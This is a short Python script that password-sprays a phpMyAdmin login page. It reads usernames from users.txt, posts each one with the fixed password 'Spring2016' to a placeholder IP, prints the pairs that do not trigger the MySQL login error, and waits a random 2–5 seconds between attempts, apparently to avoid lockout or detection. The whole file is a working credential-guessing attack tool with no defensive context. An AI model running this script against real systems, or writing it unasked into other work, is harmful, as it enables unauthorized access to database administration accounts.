import sys 
import time
import random
from requests import Session

def make_request(url, user, pw):

    with Session() as s:
        s.get(url)
        data = { 
            'pma_username': user,
            'pma_password': pw
        }   
        r = s.post(url, data=data)
        if "1045 Cannot log in to the MySQL server" not in r.text:
            print('[+]{}-{}'.format(user,pw))

def main():
    
    url = 'http://<IP>/phpmyadmin/index.php'
    pw = 'Spring2016'
    
    # Create a list of users with a single username per line
    with open('users.txt', 'r') as u:
        users = u.read().split()

    for user in users:
            make_request(url, user, pw) 
            # Sleep for a jitter between 2 and 5 seconds            
            jitter = random.randint(2,5)
            time.sleep(jitter)

if __name__ == '__main__':
    main()
